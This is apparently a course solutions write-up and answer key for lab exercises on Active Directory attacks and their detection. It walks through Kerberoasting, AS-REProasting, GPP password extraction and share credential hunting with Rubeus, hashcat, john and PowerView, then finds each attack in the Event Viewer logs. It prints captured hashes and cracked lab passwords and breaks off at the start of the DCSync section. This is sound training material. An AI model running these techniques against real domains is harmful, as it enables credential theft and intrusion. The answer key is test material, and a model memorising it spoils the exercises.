| Section | Question Number | Answer |
| --- | --- | --- |
| Kerberoasting | Question 1 | mariposa |
| Kerberoasting | Question 2 | S-1-5-21-1518138621-4282902758-752445584-2110 |
| AS-REProasting | Question 1 | shadow |
| AS-REProasting | Question 2 | S-1-5-21-1518138621-4282902758-752445584-3103 |
| GPP Passwords | Question 1 | abcd@123 |
| GPP Passwords | Question 2 | 0x80 |
| GPO Permissions/GPO Files | Question 1 | DONE |
| Credentials in Shares | Question 1 | Slavi920 |
| Credentials in Object Properties | Question 1 | Slavi1234 |
| Credentials in Object Properties | Question 2 | No |
| Credentials in Object Properties | Question 3 | S-1-5-21-1518138621-4282902758-752445584-3102 |
| DCSync | Question 1 | fcdc65703dd2b0bd789977f1f3eeaecf |
| DCSync | Question 2 | Directory Service Access |
| Golden Ticket | Question 1 | db0d0630064747072a7da3f7c3b4069e |
| Kerberos Constrained Delegation | Question 1 | C0nsTr@in3D\_F1@G\_Dc01! |
| Print Spooler & NTLM Relaying | Question 1 | d9b53b1f6d7c45a8 |
| Print Spooler & NTLM Relaying | Question 2 | \[-\] unhandled exception occured: SMB SessionError: STATUS\_OBJECT\_NAME\_NOT\_FOUND(The object name is not found.) |
| Coercing Attacks & Unconstrained Delegation | Question 1 | DONE |
| Object ACLs | Question 1 | DONE |
| PKI - ESC1 | Question 1 | Pk1\_Vuln3r@b!litY |
| PKI - ESC1 | Question 2 | 12-19-2022 |
| Skills Assessment | Question 1 | EAGLE\\DC2$ |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Kerberoasting

## Question 1

### "Connect to the target and perform a Kerbroasting attack. What is the password for the svc-iam user?"

Students need to connect to the target machine as `bob:Slavi123` with RDP, specifying their current user's home directory as a shared drive:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution /drive:share,.
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution /drive:share,.

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Next, students need to open PowerShell as Administrator, navigate to the Downloads folder, and perform the kerberoasting attack with `Rubeus.exe`:

Code: powershell

```powershell
cd C:\Users\bob\Downloads\
.\Rubeus.exe kerberoast /outfile:spn.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 21.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 22.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] SamAccountName         : svc-iam
[*] DistinguishedName      : CN=svciam,OU=Detections,OU=EagleUsers,DC=eagle,DC=local
[*] ServicePrincipalName   : http/server1
[*] PwdLastSet             : 05/04/2023 13.23.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
```

With the captured TGS tickets, students need to copy/paste the `spn.txt` file back to their attack host by way of File Explorer:

![[HTB Solutions/CDSA/z. images/5ca8faa836374c7257601f5d9bbd18d2_MD5.jpg]]

Now that the tickets have been transferred back to the attack host, students need to use `john` to crack them:

Code: shell

```shell
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt --pot=results.pot
```

```
┌─[eu-academy-2]─[10.10.15.245]─[htb-ac-594497@htb-yi105rygsz]─[~]
└──╼ [★]$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt --pot=results.pot

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
mariposa         (?)
3 1g 0:00:00:10 DONE (2023-04-19 16:15) 0.09523g/s 341517p/s 683041c/s 683041C/s   cxz..*7¡Vamos!
2 0g 0:00:00:12 DONE (2023-04-19 16:15) 0g/s 279061p/s 837183c/s 837183C/s  0125457423 .a6_123
1 0g 0:00:00:12 DONE (2023-04-19 16:15) 0g/s 278195p/s 834585c/s 834585C/s   tania.abygurl69
Waiting for 3 children to terminate
4 0g 0:00:00:12 DONE (2023-04-19 16:15) 0g/s 277549p/s 832649c/s 832649C/s  791021.ie168
Session completed
```

Once cracked, students will find the password `mariposa`.

Answer: `mariposa`

# Kerberoasting

## Question 2

### "After performing the Kerberoasting attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the ServiceSid of the webservice user?"

From the previously established RDP session, students need to click the Start button and type `Remote Desktop Connection`:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to Windows Logs -> Security and right click on Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4769`:

![[HTB Solutions/CDSA/z. images/3d91868540af3946efb3cd687fe50187_MD5.jpg]]

Students need to look through the events, finding where the incident occurred. They will see Kerberos Ticket Requests for `Administrator`, `svc-iam`, and `webservice`:

![[HTB Solutions/CDSA/z. images/9e7ddd17f79f52c1edba1944f8fd8ba7_MD5.jpg]]

Looking through the events, they will find the ServiceSid `S-1-5-21-1518138621-4282902758-752445584-2110` in the Details tab of the event.

Answer: `S-1-5-21-1518138621-4282902758-752445584-2110`

# AS-REProasting

## Question 1

### "Connect to the target and perform an AS-REProasting attack. What is the password for the user anni?"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol, specifying their current user's home directory as a shared drive:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution /drive:share,.
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution /drive:share,.

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Next, students need to open PowerShell as Administrator, navigate to the Downloads folder, and perform an `AS-REProasting` attack with `Rubeus.exe`:

Code: powershell

```powershell
cd C:\Users\bob\Downloads\
.\Rubeus.exe asreproast /outfile:asrep.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC1.eagle.local (172.16.18.3)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] SamAccountName         : svc-iam
[*] DistinguishedName      : CN=svciam,OU=Detections,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC1.eagle.local (172.16.18.3)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\svc-iam'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt
```

Using the shared drive, students need to transfer `asrep.txt` back to their attack host:

![[HTB Solutions/CDSA/z. images/ee3ac27cc62d2cf19fffc5f88e87792a_MD5.jpg]]

Once the transfer is complete, students need to modify the `asrep.txt` file. First, they need to open it with VS Code:

Code: shell

```shell
code asrep.txt &
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-mem3ncmbly]─[~]
└──╼ [★]$ code asrep.txt &

[1] 6812
```

Then, students need to modify both hashes by adding `23$` after `$krb5asrep$` :

![[HTB Solutions/CDSA/z. images/37c12e3836056c75b04081574e36aa89_MD5.jpg]]

```
$krb5asrep$23$anni@eagle.local:250483C301BC04E32EF649C13833B0DF$EC6E00081560CEAA3CEDDB2EBE28FAC253BE70C1846A4CA8B0729450C267F10A1F6A63233F25E89A37322D51EDED596C1D9A4BC16B38D67C833CD80BFB7B79D9608FCA9F91A543C2F4365AF3BD16DC163828DFB3CF20FFABD6CCB2374B884C4426EE1E26B279235CD06D8306BD0953E5FAB0F13053DEC670E293BF5550C065E888AB941CD0D7142360104280EF573CF6F146DD64584D3D96125551D8805F5C86395D8CD6596868A6705BD802E334245B3E54EAF25BC2D26B709686744BECD6D55444DD93902C15EE8196FA36F38B7CC44D38B684376CDC630A36CA9C45A61E33D08F166378EE0222251F
$krb5asrep$23$svc-iam@eagle.local:EFC82924720F1C51FB2290AA4683673F$241F314BC7FCC8E107267885B6BA4719A34040761896452A1B6449FD93E853E1B9E6BF35A3CF46072A2352723B049FD32FC595CD7267DAD4E05E39EDBAFCF74B973CA02460F587D734D9198B6A64EE00DCD3DD39D036657836669610E034B7B30EA181987D1DEEE5631B013395917A7EBEC8C0080EFC37F48DD60C9ECF3177ECF4385A80255C3551E58436048E93C1F1B620BE1162FAAAA06961E174E8BA3BCA19EC35C44940C619373AE5C3DB70F5D4ECA02B605A3D26C99DD4D9DEE119D6F083624E47C362DE0AA49F8ECD4CC1B9B32039837CDB0642C26798CB5089FB7086491285F1063C79F5DE34
```

Finally, students need to crack the hashes with `hashcat`:

Code: shell

```shell
sudo hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-mem3ncmbly]─[~]
└──╼ [★]$ sudo hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force

hashcat (v6.1.1) starting...

<SNIP>

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: asrep.txt
Time.Started.....: Mon Apr 17 17:47:28 2023, (1 sec)
Time.Estimated...: Mon Apr 17 17:47:29 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   249.6 kH/s (9.02ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 32768/28688770 (0.11%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Mon Apr 17 17:46:47 2023
Stopped: Mon Apr 17 17:47:29 2023
```

Students will find the password for the anni user inside the `asrepcrack.txt` file:

Code: shell

```shell
sudo tail -n 5 asrepcrack.txt
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-mem3ncmbly]─[~]
└──╼ [★]$ sudo tail -n 5 asrepcrack.txt 

$krb5asrep$23$svc-iam@eagle.local:efc82924720f1c51fb2290aa4683673f$241f314bc7fcc8e107267885b6ba4719a34040761896452a1b6449fd93e853e1b9e6bf35a3cf46072a2352723b049fd32fc595cd7267dad4e05e39edbafcf74b973ca02460f587d734d9198b6a64ee00dcd3dd39d036657836669610e034b7b30ea181987d1deee5631b013395917a7ebec8c0080efc37f48dd60c9ecf3177ecf4385a80255c3551e58436048e93c1f1b620be1162faaaa06961e174e8ba3bca19ec35c44940c619373ae5c3db70f5d4eca02b605a3d26c99dd4d9dee119d6f083624e47c362de0aa49f8ecd4cc1b9b32039837cdb0642c26798cb5089fb7086491285f1063c79f5de34:mariposa
$krb5asrep$23$anni@eagle.local:250483c301bc04e32ef649c13833b0df$ec6e00081560ceaa3ceddb2ebe28fac253be70c1846a4ca8b0729450c267f10a1f6a63233f25e89a37322d51eded596c1d9a4bc16b38d67c833cd80bfb7b79d9608fca9f91a543c2f4365af3bd16dc163828dfb3cf20ffabd6ccb2374b884c4426ee1e26b279235cd06d8306bd0953e5fab0f13053dec670e293bf5550c065e888ab941cd0d7142360104280ef573cf6f146dd64584d3d96125551d8805f5c86395d8cd6596868a6705bd802e334245b3e54eaf25bc2d26b709686744becd6d55444dd93902c15ee8196fa36f38b7cc44d38b684376cdc630a36ca9c45a61e33d08f166378ee0222251f:shadow
```

The plaintext password is shown to be `shadow`.

Answer: `shadow`

# AS-REProasting

## Question 2

### "After performing the AS-REProasting attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the svc-iam user?"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to `Windows Logs` --> `Security`, and right-click to `Filter Current Log...`:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4768`:

![[HTB Solutions/CDSA/z. images/5fa69d13dcfdb559877314e279708221_MD5.jpg]]

Students will find that a TGT has been requested for both `anni` and `svc-iam` users:

![[HTB Solutions/CDSA/z. images/f64d7be3317d8e9c86a1e902ee47bbb0_MD5.jpg]]

In the details tab of the event, students will find the TargetSid of `svc-iam` to be `S-1-5-21-1518138621-4282902758-752445584-3103`.

Answer: `S-1-5-21-1518138621-4282902758-752445584-3103`

# GPP Passwords

## Question 1

### "Connect to the target and run the Powersploit Get-GPPPassword function. What is the password of the svc-iis user?"

Students need to connect to the target machine as `bob:Slavi123` using RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, they need to open PowerShell as administrator and set the execution policy to unrestricted:

Code: powershell

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Next, students need to import the `Get-GPPPassword.ps1` module and run the cmdlet:

Code: powershell

```powershell
cd C:\users\bob\Downloads
Import-Module .\Get-GPPassword.ps1
Get-GPPassword
```

```
PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\Machine\Preferences\Groups
            \Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```

Students will find the password `abcd@123`.

Answer: `abcd@123`

# GPP Passwords

## Question 2

### "After running the previous attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the Access Mask of the generated events?"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to Windows Logs -> Security, and right click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4663`:

There, students will find the event confirming `bob` accessed the `SYSVOL` share:

![[HTB Solutions/CDSA/z. images/9ea5c952a641befb98b581aa223e10e4_MD5.jpg]]

The `AccessMask` is shown to be `0x80`.

Answer: `0x80`

# GPO Permissions/GPO Files

## Question 1

### "From WS001 RDP again into DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and abuse GPO directly. Once completed type DONE as the answer"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` .Then, they need to open Group Policy Management Editor, navigating to the eagle.local domain:

![[HTB Solutions/CDSA/z. images/bf4a65b0eba78de87bcb2efebfbc9a49_MD5.jpg]]

Next, students need to right click on `Default Domain Controller Policy` , and then edit, opening the Group Policy Mangement Editor.

![[HTB Solutions/CDSA/z. images/605c9a4a74acfcc053d2a96dc2068cb9_MD5.jpg]]

Students need to make a change to the group policy, such as adding a software restriction policy for Trusted Publishers:

![[HTB Solutions/CDSA/z. images/26471c52e9e62826a9e42e293a32a857_MD5.jpg]]

Saving the changes, students need to open Event Viewer and filter for event `5136`:

![[HTB Solutions/CDSA/z. images/be2cdc31d98292b199f82460ed0526ad_MD5.jpg]]

Students will note the Object class `groupPolicyContainer` and the corresponding GUID value of the modified GPO. When finished, students need to enter `Done`.

Answer: `DONE`

# Credentials in Shares

## Question 1

### "Connect to the target and enumerate the available network shares. What is the password of the Administrator2 user?"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.77.209 /u:bob /p:Slavi123 /dynamic-resolution

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, they need to open PowerShell as administrator, set the exeuction policy to unrestricted, and navigate to the Downloads directory:

Code: powershell

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
cd C:\users\bob\Downloads
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
```

Consequently, students need to import PowerView and run the Invoke-ShareFinder cmdlet:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

```
PS C:\Users\bob\Downloads> Import-Module .\PowerView.ps1
PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess

\\Server01.eagle.local\dev$     -
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\DC1.eagle.local\NETLOGON      - Logon server share
\\DC1.eagle.local\SYSVOL        - Logon server share
```

Having discovered the available share, students need to navigate to `\\Server01.eagle.local\dev$` and use findstr to search for any PowerShell scripts containing the string "administrator":

Code: powershell

```powershell
cd \\Server01.eagle.local\dev$
findstr /m /s /i "administrator" *.ps1
```

```
PS C:\Users\bob\Downloads> cd \\Server01.eagle.local\dev$
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$>findstr /m /s /i "administrator" *.ps1
2\4\4\Software\connect.ps1
2\4\4\Software\connect2.ps1
```

Now, students need to look at the contents of `connect2.ps1`:

Code: powershell

```powershell
Get-Content 2\4\4\Software\connect2.ps1
```

```
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> Get-Content 2\4\4\Software\connect2.ps1

net use Z: \\server1\administrators
net use E: \\DC1\sharedScripts /user:eagle\Administrator2 Slavi920
```

There, they will find the password `Slavi920`.

Answer: `Slavi920`

# Credentials in Object Properties

## Question 1

### "Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.77.209 /u:bob /p:Slavi123 /dynamic-resolution

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, they need to open PowerShell as administrator, set the execution policy to unrestricted, while navigating to `C:\Users\bob\Downloads\highway_to_hell-master\` , where additional tools are stored:

Code: powershell

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
cd C:\users\bob\Downloads\highway_to_hell-master\
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\highway_to_hell-master\
```

Therefore, to look for credentials in object properties, students need to use the SearchUser.ps1 script:

Code: powershell

```powershell
.\SearchUser.ps1 -Terms pass
```

```
PS C:\Users\bob\Downloads\highway_to_hell-master> .\SearchUser.ps1 -Terms pass

SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi1234
Info                 :
PasswordNeverExpires : True
PasswordLastSet      : 12/6/2022 12:18:05 AM
```

Students will find the password `Slavi1234`.

Answer: `Slavi1234`

# Credentials in Object Properties

## Question 2

### "Using the password discovered in the previous question, try to authenticate to DC1 as the bonni Is. Was the password valid?"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `bonni:Slavi1234` to test the authentication:

![[HTB Solutions/CDSA/z. images/2eb4d2e3de114ad3c8018a9749662cb8_MD5.jpg]]

Because the logon attempt failed, the answer is `No`, and the discovered password is not valid.

Answer: `No`

# Credentials in Object Properties

## Question 3

### "Connect to DC1 as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to Windows Logs -> Security, and right click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4771`.

![[HTB Solutions/CDSA/z. images/d8f81645433793107395b1593bbadb38_MD5.jpg]]

The Kerberos pre-authentication failure event reveals the TargetSid `S-1-5-21-1518138621-4282902758-752445584-3102`.

Answer: `S-1-5-21-1518138621-4282902758-752445584-3102`

# DCSync

## Question 1

### "Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution

